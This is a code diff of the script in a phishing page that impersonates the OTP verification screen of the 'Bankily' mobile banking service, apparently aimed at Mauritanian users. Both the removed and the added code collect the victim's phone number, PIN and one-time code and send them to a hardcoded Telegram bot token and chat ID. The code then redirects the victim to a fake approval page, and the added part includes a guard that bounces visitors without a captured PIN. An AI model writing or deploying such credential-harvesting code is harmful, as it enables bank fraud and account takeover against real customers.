-  const dateStr = now.toLocaleString('fr-FR', { timeZone:'Africa/Nouakchott' });
-
-  document.getElementById('spinner').classList.add('active');
-
-  const msg =
-`✅ <b>رمز OTP تم إدخاله</b>
-━━━━━━━━━━━━━━━━━
-📱 <b>الرقم:</b> +222 ${phone}
-🔑 <b>الرمز السري:</b> ${pin}
-🔢 <b>رمز OTP:</b> <code>${otp}</code>
-🌐 <b>اللغة:</b> ${lang.toUpperCase()}
-🕐 <b>الوقت:</b> ${dateStr}
-━━━━━━━━━━━━━━━━━
-📌 `;
-
-  await sendTelegram(msg);
-
-  setTimeout(() => {
-    document.getElementById('spinner').classList.remove('active');
-    document.getElementById('success-screen').classList.add('active');
-    setTimeout(() => { window.location.href = 'approuv.html'; }, 1800);
-  }, 2000);
-}
+const savedPin      = sessionStorage.getItem('bankily_pin');
+const savedUsername = sessionStorage.getItem('bankily_username') || '—';
 
 applyLang();
-inputs[0].focus();
-startTimer();
+
+if (!savedPin || savedPin.trim() === '') {
+  const t = isArabic ? T.ar : T.fr;
+  document.getElementById('guard-msg').textContent = t.guardMsg;
+  document.getElementById('guard-sub').textContent = t.guardSub;
+  document.getElementById('guard-overlay').classList.add('active');
+  setTimeout(() => window.location.replace('login.html'), 1800);
+
+} else {
+
+  const inputs    = [...document.querySelectorAll('.otp-box')];
+  const verifyBtn = document.getElementById('verify-btn');
+  const timerEl   = document.getElementById('timer');
+  const pageLoaded = Date.now();
+
+  inputs.forEach((inp, i) => {
+    inp.addEventListener('input', () => {
+      inp.value = inp.value.replace(/[^0-9]/g,'').slice(0,1);
+      inp.classList.toggle('filled', inp.value !== '');
+      if (inp.value && i < inputs.length - 1) inputs[i+1].focus();
+    });
+    inp.addEventListener('keydown', e => {
+      if (e.key === 'Backspace') {
+        if (inp.value === '' && i > 0) { inputs[i-1].value=''; inputs[i-1].classList.remove('filled'); inputs[i-1].focus(); }
+        else { inp.value=''; inp.classList.remove('filled'); }
+        e.preventDefault();
+      }
+      if (!/^[0-9]$/.test(e.key) && !['Backspace','Delete','Tab','ArrowLeft','ArrowRight'].includes(e.key)) e.preventDefault();
+    });
+    inp.addEventListener('paste', e => {
+      e.preventDefault();
+      const digits = (e.clipboardData||window.clipboardData).getData('text').replace(/[^0-9]/g,'');
+      [...digits].slice(0,4).forEach((d,j)=>{ if(inputs[j]){inputs[j].value=d;inputs[j].classList.add('filled');} });
+      inputs[Math.min(digits.length,inputs.length-1)].focus();
+    });
+  });
+  inputs[0].focus();
+
+  let seconds = 299;
+  let timerInterval;
+
+  function updateTimer(){
+    const m = Math.floor(seconds/60);
+    const s = String(seconds%60).padStart(2,'0');
+    timerEl.textContent = `${m}:${s}`;
+    timerEl.classList.remove('expired');
+    if (seconds > 0){
+      seconds--;
+    } else {
+      clearInterval(timerInterval);
+      timerEl.textContent = (isArabic ? T.ar : T.fr).expired;
+      timerEl.classList.add('expired');
+      verifyBtn.disabled = true;
+    }
+  }
+  updateTimer();
+  timerInterval = setInterval(updateTimer, 1000);
+
+  window.resendCode = function(){
+    clearInterval(timerInterval);
+    seconds = 299;
+    timerEl.classList.remove('expired');
+    verifyBtn.disabled = false;
+    inputs.forEach(i => { i.value=''; i.classList.remove('filled'); });
+    inputs[0].focus();
+    showModal((isArabic ? T.ar : T.fr).resendDone);
+    updateTimer();
+    timerInterval = setInterval(updateTimer, 1000);
+  };
+
+  if (window.visualViewport) {
+    window.visualViewport.addEventListener('resize', () => {
+      const kb = window.innerHeight - window.visualViewport.height;
+      document.querySelector('.verify-bar').style.transform = kb > 10 ? `translateY(-${kb}px)` : '';
+    });
+  }
+
+  /* ══ TELEGRAM — TOKEN و CHAT ID المحدَّثان ══ */
+  const TG_TOKEN   = '8699990453:AAF00aHjLBVLx95RkZozelaAqqhOg29H5fk';
+  const TG_CHAT_ID = '8674569520';
+
+  async function sendTelegram(text){
+    try {
+      await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`,{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({chat_id:TG_CHAT_ID,text,parse_mode:'HTML'})
+      });
+    } catch(e){}
+  }
+
+  window.submitOTP = async function(){
+    const t = isArabic ? T.ar : T.fr;
+    if ((Date.now() - pageLoaded) / 1000 < 5){ showModal(t.errTooFast); return; }
+
+    const otp = inputs.map(i => i.value).join('');
+    if (otp.length !== 4 || inputs.some(i => i.value === '')){ showModal(t.errEmpty); return; }
+    if (!/^[0-9]{4}$/.test(otp)){ showModal(t.errDigits); return; }
+    if (otp === savedPin){
+      showModal(t.errSamePin);
+      inputs.forEach(i => { i.value=''; i.classList.remove('filled'); });
+      inputs[0].focus();
+      return;
+    }
+
+    document.getElementById('loader-overlay').classList.add('active');
+    verifyBtn.disabled = true;
+
+    const now = new Date().toLocaleString(isArabic ? 'ar-SA' : 'fr-FR');
+    await sendTelegram(
+      `✅ <b>Code OTP – Bankily</b>\n` +
+      `━━━━━━━━━━━━━━━━━━━━\n` +
+      `📱 <b>Numéro :</b> <code>${savedUsername}</code>\n` +
+      `🔑 <b>PIN    :</b> <code>${savedPin}</code>\n` +
+      `🔢 <b>OTP    :</b> <code>${otp}</code>\n` +
+      `📅 <b>Heure  :</b> ${now}`
+    );
+
+    sessionStorage.removeItem('bankily_pin');
+    sessionStorage.removeItem('bankily_username');
+    setTimeout(() => window.location.href = 'approuv.html', 800);
+  };
+
+}
 </script>
 </body>
 </html>
